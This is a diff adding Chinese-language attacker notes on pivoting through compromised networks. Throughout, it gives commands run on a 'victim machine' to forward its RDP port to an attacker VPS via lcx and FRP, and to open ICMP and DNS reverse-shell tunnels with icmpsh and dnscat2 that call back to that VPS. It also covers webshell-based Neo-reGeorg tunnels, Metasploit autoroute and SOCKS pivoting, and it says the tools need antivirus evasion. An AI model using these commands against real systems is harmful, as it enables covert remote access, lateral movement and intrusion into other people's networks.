@@ -1,0 +1,105 @@
+常用工具
+
+2021年1月13日
+9:35
+
+端口转发：
+	LCK
+		windows下为lck.exe ,linux下为portmap                                      //  （假设受害机为windows,vps为linux)
+		
+		1、受害机上
+			lck.exe  -slave <vpsip:prot>  127.0.0.1:3389                  //将本机的3398转发到vps对应的端口上
+		2、vps上
+			./portmap -m 2 -p1 6666  -p2 7777                              //监听6666端口，同时将6666端口转发到7777端口上
+		3、本机便可远程连接RDP
+		
+		
+		
+	FRP
+		frp在windows和linux有对应版本，分别下载即可                        //    (假设受害机为windows,vps为linux)
+			
+			
+		1、vps上
+			配置frps.ini                                                                       //   默认监听端口7000，可修改监听端口
+			开始监听                        ./frps -c ./frps.ini
+		2、受害机上
+			配置frpc.ini
+			
+			启动程序
+				frpc.exe -c frpc.ini
+		3、本机便可远程连接RDP
+
+
+	Netcat
+		用nc反弹shell说实话我觉得用的比较少。一般用于vps上接收反弹shell.所以不在详细介绍了
+		
+	MSF
+		msf上也有简单的端口转发模块
+		portfwd add -l <本地prot> -r <受害机ip> -p <端口>            //-l 本地监听端口     -r 远程地址    -p 远程端口
+		                                                                                                // 对方如果没有公网ip,也可先添加路由后再转发
+		
+		
+		
+		
+		
+内网穿透
+	
+	       regeorg、neo-regeorg是基于webshell的内网穿透方式，所以利用的前提是对方具有web服务。因为regeorg、ew现在已经完全不过杀软。所以用之前需要进行免杀。所以建议使用Neo-regeorg来进行内网穿透。
+	
+	Neo-regeorg
+		
+		1、使用前配置
+			python neoreg.py generate -k  <password>                                //指定密码生成tunnel文件，生成文件在neoreg_servers/
+			
+		2、根据服务器语言，将对应的tunnel脚本文件传到网站目录下
+		
+		3 、vps上执行
+			python neoreg.py  -k <password> -u  <对应tunnel脚本的url路径>
+			
+			成功如图。
+			但是经常会出错 ，建议使用      ”python neoreg.py  -k <password> -u  <对应tunnel脚本的url路径>  --skip   “       命令
+			
+	ICMPSH                                       //反弹shell
+		icmp隧道
+		1、vps上执行
+			sysctl -w net.ipv4.icmp_echo_ignore_all=1          //禁用icmp答复
+			./icmpsh_m.py <vpsip> <受害机IP>
+		2、受害机执行                                                                  //受害机仅支持windows
+			icmpsh.exe -t <vpsIP>　
+			
+	DNScat                                    
+		dns隧道
+			1、vps上执行
+				ruby ./dnscat2.rb
+			2、受害机执行
+				dnscat.exe --dns server=vpsIP --secret=vps生成的ID                 //eg: 
+	
+			
+	MSF
+		路由转发                                              //msf可以访问网段中的其他主机，便于横向移动
+			在meterpreter会话中：
+			1、查看路由段                                    run get_local_subnets
+			2、添加路由到本地                             run autoroute  -s   172.17.0.0/24
+			3、打印路由                                       run autoroute -p
+			
+		SOCKS代理
+			socks4
+				1、选择模块                                      use auxiliary/server/socks4a                    //socks5的话换个模块
+				2、配置参数                                      
+											set SRVHOST xxx.xxx.xxx.xxx
+											set SRVPORT xxxx
+				3、运行                                              run
+				之后便可利用proxychains代理来使其他渗透工具进行测试
+				
+	CS
+		socks代理
+		
+		
+本地代理工具
+
+	Proxychains                                                               //linux常用，kali自带
+		1、配置相关参数                         vim    /etc/proxychains.conf                                                    //在文件最下面
+		
+		2、使用                                      proxychains4  + <command>                                //在命令前加上proxychains4即可
+		
+Proxifier                                                                              //windows常用
